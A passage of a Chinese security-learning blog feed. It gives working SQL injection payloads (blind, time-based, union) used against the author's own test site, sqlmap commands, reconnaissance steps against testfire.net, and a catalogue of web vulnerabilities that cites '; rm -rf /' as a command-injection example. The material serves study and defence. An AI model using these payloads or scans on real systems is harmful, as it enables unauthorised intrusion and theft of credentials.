class="line">ascii()</span><br></pre></td></tr></table></figure><p>一个个试太麻烦，为了方便可以利用yakit或者burp</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断数据库字长</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=7 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=115 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201722632.png"></p><p>利用页面的正常回显来判断，最后组合字符</p></li><li><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>页面没有明确回显信息，可以利用响应时间判断</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>函数</span><br><span class="line">if()</span><br><span class="line">sleep()</span><br><span class="line">bentchmark()</span><br><span class="line">substr()</span><br><span class="line">length()</span><br></pre></td></tr></table></figure><p>可以利用burp或yakit辅助</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断数据库名字长</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201732030.png"></p><p>通过响应时间进行判断</p></li></ul><h3 id="2、对自己上周编写的网站进行sql注入的尝试"><a href="#2、对自己上周编写的网站进行sql注入的尝试" class="headerlink" title="2、对自己上周编写的网站进行sql注入的尝试"></a>2、对自己上周编写的网站进行sql注入的尝试</h3><h4 id="①判断注入类型"><a href="#①判断注入类型" class="headerlink" title="①判断注入类型"></a>①判断注入类型</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=2</span></span><br><span class="line"><span class="string">?id=2-1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201859615.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201859003.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201900290.png"></p><p>页面回显一致，证明是字符型</p><h4 id="②判断列数"><a href="#②判断列数" class="headerlink" title="②判断列数"></a>②判断列数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201901406.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201902100.png"></p><p>字段数为3</p><h4 id="③判断回显"><a href="#③判断回显" class="headerlink" title="③判断回显"></a>③判断回显</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201903956.png"></p><h4 id="④查询数据库名"><a href="#④查询数据库名" class="headerlink" title="④查询数据库名"></a>④查询数据库名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201904743.png"></p><h4 id="⑤查询表名"><a href="#⑤查询表名" class="headerlink" title="⑤查询表名"></a>⑤查询表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>cms<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201905127.png"></p><p>只有一个表</p><h4 id="⑥查询字段名"><a href="#⑥查询字段名" class="headerlink" title="⑥查询字段名"></a>⑥查询字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>cms<span class="string">&#x27; and table_name=&#x27;</span><span class="keyword">user</span><span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201907492.png"></p><h4 id="⑦获取数据"><a href="#⑦获取数据" class="headerlink" title="⑦获取数据"></a>⑦获取数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(uname),group_concat(pass) from cms.user --+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201909699.png"></p><h3 id="3、使用sqlmap注入出靶场网站的所有数据库"><a href="#3、使用sqlmap注入出靶场网站的所有数据库" class="headerlink" title="3、使用sqlmap注入出靶场网站的所有数据库"></a>3、使用sqlmap注入出靶场网站的所有数据库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;xxx.com?id=&quot;</span></span><br><span class="line">-u //指定目标url</span><br><span class="line">--data=<span class="string">&quot;&quot;</span> //post注入，如<span class="string">&quot;user=admin&amp;password=admin123&quot;</span></span><br><span class="line">-r //指定http请求文件，适用于post</span><br><span class="line">--dbs //列出该网站所有数据库</span><br><span class="line">--batch //默认指令</span><br><span class="line">--current-db //获取当前数据库名</span><br><span class="line">-D //指定数据库</span><br><span class="line">--tables //列出表名</span><br><span class="line">-T //指定表</span><br><span class="line">--columns //列出字段名</span><br><span class="line">-C //指定字段</span><br><span class="line">--dump //获取数据</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201923684.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201923615.png"></p><p>获取到所有库名</p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h3 id="尝试编写代码修复sql注入漏洞"><a href="#尝试编写代码修复sql注入漏洞" class="headerlink" title="尝试编写代码修复sql注入漏洞"></a>尝试编写代码修复sql注入漏洞</h3><p>原代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$dbusername</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpassword</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;cms&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$dbusername</span>, <span class="variable">$dbpassword</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备和绑定</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT id, uname, pass FROM user WHERE id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;请输入ID&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以进行正则匹配，限定字符</p><p>改后</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使输入必须为数字</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]+$/&#x27;</span>, <span class="variable">$id</span>)) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;非法输入：ID必须是数字&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后继续进行注入试试</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201938553.png"></p><p>成功限制</p><h3 id="思考假如传参方式是post，sqlmap该如何使用"><a href="#思考假如传参方式是post，sqlmap该如何使用" class="headerlink" title="思考假如传参方式是post，sqlmap该如何使用"></a>思考假如传参方式是post，sqlmap该如何使用</h3><p>post可以利用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--data参数或者-r参数指定文件</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;xxx.com&quot;</span> --data<span class="string">&quot;username=admin&amp;password=123&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201944310.png"></p><p>成功进行注入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//创建一个http请求的txt文件</span><br><span class="line">vim test.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201946876.png"></p><p>然后进行注入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201948552.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508201949334.png"></p><p>成功注入</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-信息收集</title>
      <link href="/2025/08/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2025/08/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>！！！不要对互联网未授权资产做主动信息收集</p><h3 id="1、针对xiusafe-com域名，尝试绕过cdn"><a href="#1、针对xiusafe-com域名，尝试绕过cdn" class="headerlink" title="1、针对xiusafe.com域名，尝试绕过cdn"></a>1、针对xiusafe.com域名，尝试绕过cdn</h3><h4 id="①cdn简介"><a href="#①cdn简介" class="headerlink" title="①cdn简介"></a>①cdn简介</h4><p>CDN 的全称是 Content Delivery Network，即内容分发网络；</p><p>CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。 关键技术：内容存储与分发技术</p><h4 id="②cdn检测"><a href="#②cdn检测" class="headerlink" title="②cdn检测"></a>②cdn检测</h4><p>如何检测一个网站是否使用了cdn服务</p><ul><li><h5 id="nslookup-ping"><a href="#nslookup-ping" class="headerlink" title="nslookup&amp;ping"></a>nslookup&amp;ping</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup xxx.com</span><br><span class="line">ping xxx.com</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191605705.png"></li></ul><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191605714.png"></p><p>可以看到并非同一ip，推测使用了cdn服务</p><ul><li><h5 id="多地ping测试"><a href="#多地ping测试" class="headerlink" title="多地ping测试"></a>多地ping测试</h5><p>使用在线平台测试</p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191609413.png"></p></li></ul><p>可以看到ping到39个ip，由此确定使用了cdn服务</p><h4 id="③绕过cdn"><a href="#③绕过cdn" class="headerlink" title="③绕过cdn"></a>③绕过cdn</h4><ul><li><h5 id="国外主机访问"><a href="#国外主机访问" class="headerlink" title="国外主机访问"></a>国外主机访问</h5><p>该站使用的cdn服务只在国内具有节点服务器，国外不存在节点服务器，当使用国外主机进行访问的时候，可能访问到真实ip</p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191614266.png"></p></li></ul><p>这个方法貌似行不通，存在三个ip</p><ul><li><h5 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h5><p>查看历史DNS记录，可能存在使用cdn之前的ip</p><p>微步在线，<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191634906.png"></p></li></ul><p>解析到133条记录，可以挨个通过ip去进行访问，若是访问到，那就是真实ip，最好从后往前去访问</p><ul><li><h5 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h5><p>有些网站只对主域名使用了cdn服务，但是子域名没有，且主域名和子域名指向同一台服务器，查到子域名后对子域名进行dns解析，可能查到真实ip</p><p>在线平台</p><p><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191645478.png"></p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191709256.png"></p></li><li><h5 id="网络空间引擎"><a href="#网络空间引擎" class="headerlink" title="网络空间引擎"></a>网络空间引擎</h5><p>FOFA <a href="https://fofa.info/">https://fofa.info/</a></p><p>直接搜索域名</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191716501.png"></p></li></ul><p>看到有一个ip，并且也搜到了cdn服务商，直接去访问ip地址</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191717112.png"></p><p>成功拿到真实ip</p><ul><li><h5 id="查看网站源代码"><a href="#查看网站源代码" class="headerlink" title="查看网站源代码"></a>查看网站源代码</h5><p>有些网站源代码可能藏有有用信息</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191724040.png"></p></li></ul><p>这个网站源码貌似没有有用信息</p><h3 id="2、针对testfire-net网站，进行信息收集"><a href="#2、针对testfire-net网站，进行信息收集" class="headerlink" title="2、针对testfire.net网站，进行信息收集"></a>2、针对testfire.net网站，进行信息收集</h3><h4 id="①资产收集"><a href="#①资产收集" class="headerlink" title="①资产收集"></a>①资产收集</h4><p>通过搜索语法进行收集，资产存在哪些敏感页面，如登录框，后台等，可以作为攻击点，同时也可以查询旁站，旁站防御力弱，容易攻击，可以作为跳板</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:testfire.net</span><br><span class="line">inurl:login/admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191729968.png"></p><h4 id="②子域名收集"><a href="#②子域名收集" class="headerlink" title="②子域名收集"></a>②子域名收集</h4><p>使用yakit的子域名收集功能，搜索更多有用信息</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191742546.png"></p><p>看到该服务器貌似还开启了ftp服务，可以尝试ftp爆破，并且暴露了ip</p><h4 id="③whois信息"><a href="#③whois信息" class="headerlink" title="③whois信息"></a>③whois信息</h4><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等</p><p>使用站长之家的whois查询功能，直接搜索域名</p><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191750857.png"></p><p>查找到一些信息</p><h4 id="④端口扫描"><a href="#④端口扫描" class="headerlink" title="④端口扫描"></a>④端口扫描</h4><p>扫描端口和已经开放的服务，作为攻击点</p><p>使用nmap扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 65.61.137.117</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191835782.png"></p><p>可以看到使用smtp和pop3邮件服务，可以尝试对此服务进行攻击</p><h4 id="⑤网站架构"><a href="#⑤网站架构" class="headerlink" title="⑤网站架构"></a>⑤网站架构</h4><p>使用插件wappalyzer</p><p>有些网站可能会暴露中间件，框架的版本信息，可以利用这些信息去找相关漏洞</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191907768.png"></p><h4 id="⑥网站前端源码"><a href="#⑥网站前端源码" class="headerlink" title="⑥网站前端源码"></a>⑥网站前端源码</h4><p>有些开发者可能会将敏感信息存在前端源码的注释中</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191909286.png"></p><h4 id="⑦目录扫描"><a href="#⑦目录扫描" class="headerlink" title="⑦目录扫描"></a>⑦目录扫描</h4><p>可以找网站存在哪些敏感文件，或者后台</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191926112.png"></p><h4 id="⑧c段收集"><a href="#⑧c段收集" class="headerlink" title="⑧c段收集"></a>⑧c段收集</h4><p>使用fofa进行搜索同一网段下的其他服务器，有可能他们属于同一内网，对其他薄弱服务器进行攻击</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191934307.png"></p><h4 id="⑨指纹识别"><a href="#⑨指纹识别" class="headerlink" title="⑨指纹识别"></a>⑨指纹识别</h4><p>了解网站架构，方便利用</p><p><a href="http://sso.tidesec.com/">http://sso.tidesec.com/</a></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508191938371.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web练习5</title>
      <link href="/2025/08/15/web%E7%BB%83%E4%B9%A05/"/>
      <url>/2025/08/15/web%E7%BB%83%E4%B9%A05/</url>
      
        <content type="html"><![CDATA[<h3 id="一、常见web漏洞的成因和危害"><a href="#一、常见web漏洞的成因和危害" class="headerlink" title="一、常见web漏洞的成因和危害"></a>一、常见web漏洞的成因和危害</h3><h4 id="1-SQL-注入相关漏洞"><a href="#1-SQL-注入相关漏洞" class="headerlink" title="1.SQL 注入相关漏洞"></a>1.SQL 注入相关漏洞</h4><ul><li>基础 SQL 注入（SQLi）</li></ul><p>​       成因：对用户的输入数据未经过滤，导致可以执行sql语句</p><p>​       危害：数据库数据泄露、篡改、删除，甚至获取服务器控制权</p><ul><li><p>报错注入</p><p>成因：数据库错误信息直接返回前端</p><p>危害：泄露数据库敏感信息</p></li><li><p>二次注入（存储型 SQL 注入的特殊形式，输入存储后触发）</p><p>成因：恶意输入先被存储，后续操作中触发 SQL 执行</p><p>危害：绕过初次过滤，实现持久化攻击，如修改密码</p></li><li><p>堆叠注入（通过分号执行多条 SQL 语句）</p><p>成因：支持分号<code>;</code>执行多条 SQL 语句</p><p>危害：数据库数据泄露、篡改、删除，甚至获取服务器控制权</p></li><li><p>布尔盲注（基于查询结果的真假判断）</p><p>成因：页面无显式错误信息，但可通过真&#x2F;假或延迟响应判断结果</p><p>危害：隐蔽地提取数据</p></li><li><p>时间盲注（基于延迟响应判断）</p><p>成因：页面无显式错误信息，但可通过真&#x2F;假或延迟响应判断结果</p><p>危害：隐蔽地提取数据</p></li><li><p>GET 注入（URL 参数）</p></li><li><p>POST 注入（表单数据）</p></li><li><p>Cookie 注入（Cookie 字段）</p></li><li><p>User-Agent 注入（请求头字段）</p></li><li><p>Referer 注入（请求头字段）</p><p>成因：未对 HTTP 请求各参数（URL&#x2F;表单&#x2F;Cookie&#x2F;Header）过滤</p><p>危害：与其他sql注入相同，攻击入口更广泛</p></li></ul><h4 id="2-跨站脚本（XSS）相关漏洞"><a href="#2-跨站脚本（XSS）相关漏洞" class="headerlink" title="2.跨站脚本（XSS）相关漏洞"></a>2.跨站脚本（XSS）相关漏洞</h4><ul><li><p>存储型 XSS（恶意脚本存储到服务器，持久触发）</p><p>成因：恶意脚本存入数据库，其他用户访问时触发</p><p>危害：盗取用户 Cookie、会话劫持、钓鱼攻击、传播蠕虫</p></li><li><p>反射型 XSS（脚本随请求返回，一次性触发）</p><p>成因：恶意脚本随 URL 参数返回页面，需用户点击触发</p><p>危害：短时攻击，如钓鱼链接，窃取当前用户敏感信息</p></li><li><p>DOM 型 XSS（客户端 DOM 解析时执行，不经过服务器）</p><p>成因：前端 JavaScript 动态修改 DOM 时未转义输入</p><p>危害：无需服务器参与，纯客户端攻击</p></li></ul><h4 id="3-命令注入相关漏洞"><a href="#3-命令注入相关漏洞" class="headerlink" title="3.命令注入相关漏洞"></a>3.命令注入相关漏洞</h4><ul><li><p>直接命令注入（用户输入直接拼接系统命令执行）</p><p>成因：用户输入直接拼接系统命令，如 &#96;; rm -rf &#x2F;</p><p>危害：执行任意系统命令、删文件、挖矿</p></li><li><p>间接命令注入（通过文件上传、配置文件等间接触发）</p><p>成因：通过上传文件&#x2F;配置文件触发命令执行</p><p>危害：执行任意系统命令、删文件、挖矿</p></li></ul><h4 id="4-文件操作相关漏洞"><a href="#4-文件操作相关漏洞" class="headerlink" title="4.文件操作相关漏洞"></a>4.文件操作相关漏洞</h4><h5 id="①文件上传漏洞（细分-4-类）"><a href="#①文件上传漏洞（细分-4-类）" class="headerlink" title="①文件上传漏洞（细分 4 类）"></a>①文件上传漏洞（细分 4 类）</h5><ul><li><p>后缀名绕过（如.php5、.phtml）</p><p>成因：未校验扩展名</p><p>危害：上传 WebShell，控制服务器</p></li><li><p>MIME 类型绕过（修改Content-Type）</p><p>成因：仅校验客户端 <code>Content-Type</code></p><p>危害：上传 WebShell，控制服务器</p></li><li><p>路径遍历结合上传（如..&#x2F;shell.php）</p><p>成因：文件名含 <code>../</code></p><p>危害：将恶意文件写入非预期目录</p></li><li><p>解析漏洞利用（如 IIS&#x2F;nginx 解析缺陷）</p><p>成因：服务器缺陷</p><p>危害：将恶意文件写入非预期目录</p></li></ul><h5 id="②文件包含漏洞"><a href="#②文件包含漏洞" class="headerlink" title="②文件包含漏洞"></a>②文件包含漏洞</h5><ul><li><p>本地文件包含（LFI，包含服务器本地文件）</p><p>成因：动态包含文件时未限制路径</p><p>危害：读取敏感文件、执行代码注入</p></li><li><p>远程文件包含（RFI，包含远程恶意文件）</p><p>成因：允许包含远程 URL</p><p>危害：直接执行远程恶意代码</p></li><li><p>任意文件读取（未授权读取敏感文件，如&#x2F;etc&#x2F;passwd）</p><p>成因：未校验文件路径参数</p><p>危害：泄露源码、配置文件、数据库凭证</p></li><li><p>任意文件删除（未授权删除服务器文件）</p><p>成因：删除操作未授权校验</p><p>危害：删除关键日志或配置文件</p></li><li><p>任意文件写入（未授权写入文件，如写入后门）</p><p>成因：写入操作未限制路径与内容</p><p>危害：写入 WebShell 或恶意脚本</p></li></ul><h4 id="5-认证与授权漏洞"><a href="#5-认证与授权漏洞" class="headerlink" title="5.认证与授权漏洞"></a>5.认证与授权漏洞</h4><ul><li><p>弱口令（密码复杂度不足，易被暴力破解）</p><p>成因：用户或管理员使用简单密码&#x2F;未改默认密码</p><p>危害：账号被爆破，攻击者直接登录</p></li><li><p>默认口令（未修改设备 &#x2F; 系统默认账号密码）</p><p>成因：用户或管理员使用简单密码&#x2F;未改默认密码</p><p>危害：账号被爆破，攻击者直接登录</p></li><li><p>密码明文传输（未加密传输，如 HTTP 传输密码）</p><p>成因：未进行加密处理，未使用 HTTPS 加密</p><p>危害：中间人窃取密码</p></li><li><p>会话固定（固定会话 ID，诱导用户使用）</p><p>成因：会话 ID 不变或未绑定 IP&#x2F;User-Agent</p><p>危害：攻击者劫持合法会话冒充用户</p></li><li><p>会话劫持（窃取会话 ID 冒充用户）</p><p>成因：会话 ID 不变或未绑定 IP&#x2F;User-Agent</p><p>危害：攻击者劫持合法会话冒充用户</p></li><li><p>水平越权（访问同权限用户数据，如查他人订单）</p><p>成因：未校验数据归属，如id等</p><p>危害：访问他人敏感数据</p></li><li><p>垂直越权（低权限访问高权限功能，如普通用户进后台）</p><p>成因：未校验用户角色，管理员id或用户id</p><p>危害：执行高权限操作</p></li><li><p>权限提升（通过漏洞获取更高权限）</p><p>成因：存在具有高权限文件，如suid</p><p>危害：提升权限</p></li><li><p>认证绕过（直接跳过登录验证，如逻辑缺陷）</p><p>成因：逻辑缺陷</p><p>危害：通过对请求包进行修改</p></li><li><p>多因素认证缺失（仅单因素认证，易被破解）</p><p>成因：设置简单验证方式，如仅密码认证，无验证码，生物验证等</p><p>危害：若密码可爆破，则被盗取</p></li><li><p>密码重置逻辑漏洞（如验证码复用、重置链接永久有效）</p><p>成因：验证码复用、重置链接无时效限制</p><p>危害：重置任意用户密码</p></li></ul><h4 id="6-跨站请求伪造（CSRF）相关漏洞"><a href="#6-跨站请求伪造（CSRF）相关漏洞" class="headerlink" title="6.跨站请求伪造（CSRF）相关漏洞"></a>6.跨站请求伪造（CSRF）相关漏洞</h4><ul><li><p>基础 CSRF（诱导用户在已登录状态执行操作）</p><p>成因：关键操作（如转账）未校验请求来源</p><p>危害：诱骗用户执行非自愿操作</p></li><li><p>GET 型 CSRF（利用 GET 请求的幂等性触发）</p><p>成因：利用 GET 请求幂等性或自动提交表单触发，配合xss漏洞利用</p><p>危害：诱骗用户执行非自愿操作</p></li><li><p>POST 型 CSRF（利用表单自动提交触发）</p><p>成因：配合xss漏洞利用</p><p>危害：诱骗用户执行非自愿操作</p></li></ul><h4 id="7-逻辑漏洞"><a href="#7-逻辑漏洞" class="headerlink" title="7.逻辑漏洞"></a>7.逻辑漏洞</h4><ul><li><p>支付逻辑漏洞（如价格篡改、重复支付退款）</p><p>成因：前端校验价格&#x2F;数量，后端未二次校验</p><p>危害：0元购、重复退款、无限刷积分</p></li><li><p>订单逻辑漏洞（如越权修改订单状态、重复下单）</p><p>成因：前端校验价格&#x2F;数量，后端未二次校验</p><p>危害：0元购、重复退款、无限刷积分</p></li><li><p>注册逻辑漏洞（如重复注册、批量注册、手机号复用）</p><p>成因：手机号&#x2F;邮箱未绑定用户、验证码泄露或复用</p><p>危害：批量注册垃圾账号</p></li><li><p>密码找回逻辑漏洞（如跳过验证步骤、验证码泄露）</p><p>成因：手机号&#x2F;邮箱未绑定用户、验证码泄露或复用</p><p>危害：盗号</p></li><li><p>验证码逻辑漏洞（如验证码过期时间长、可重复使用）</p><p>成因：手机号&#x2F;邮箱未绑定用户、验证码泄露或复用</p><p>危害：批量注册垃圾账号、盗号</p></li><li><p>业务流程绕过（如跳过关键步骤完成操作）</p><p>成因：未强制顺序执行步骤</p><p>危害：破坏业务规则，造成资损</p></li></ul><h4 id="8-XML-与数据格式相关漏洞"><a href="#8-XML-与数据格式相关漏洞" class="headerlink" title="8.XML 与数据格式相关漏洞"></a>8.XML 与数据格式相关漏洞</h4><ul><li><p>XML 外部实体注入（XXE，利用外部实体读取文件 &#x2F; 执行命令）</p><p>成因：解析 XML 时启用外部实体</p><p>危害：读取服务器文件、SSRF、拒绝服务</p></li><li><p>XPath 注入（XPath 查询未过滤，导致数据泄露）</p><p>成因：XPath 查询拼接用户输入未过滤</p><p>危害：泄露 XML 数据库内容</p></li></ul><h4 id="9-服务器配置漏洞"><a href="#9-服务器配置漏洞" class="headerlink" title="9.服务器配置漏洞"></a>9.服务器配置漏洞</h4><ul><li><p>目录遍历（通过..&#x2F;等路径访问非预期目录）</p><p>成因：未过滤路径参数中的 ..&#x2F;</p><p>危害：读取敏感文件</p></li><li><p>敏感信息泄露（如 PHPINFO、数据库错误详情、日志泄露）</p><p>成因：通过报错导致详情暴露</p><p>危害：泄露数据库密码、服务器路径、API 密钥</p></li><li><p>服务器版本泄露（响应头暴露 Apache&#x2F;Nginx 版本）</p><p>成因：未对版本信息隐藏</p><p>危害：利用相应版本存在的漏洞</p></li><li><p>默认页面未删除（如phpMyAdmin、test.php默认路径）</p><p>成因：未删除默认页面</p><p>危害：敏感信息泄露</p></li><li><p>目录索引开启（未禁用自动目录列表，泄露文件结构）</p><p>成因：未关闭 Options -Indexes</p><p>危害：暴露目录结构，发现隐藏文件</p></li><li><p>不安全 HTTP 方法（开启 PUT&#x2F;DELETE，允许文件操作）</p><p>成因：开启 PUT&#x2F;DELETE 等方法</p><p>危害：攻击者直接上传&#x2F;删除服务器文件</p></li><li><p>CORS 配置不当（跨域资源共享规则过松，泄露数据）</p><p>成因：响应头 Access-Control-Allow-Origin: *</p><p>危害：恶意网站跨域读取用户敏感数据</p></li></ul><h4 id="10-密码学与传输漏洞"><a href="#10-密码学与传输漏洞" class="headerlink" 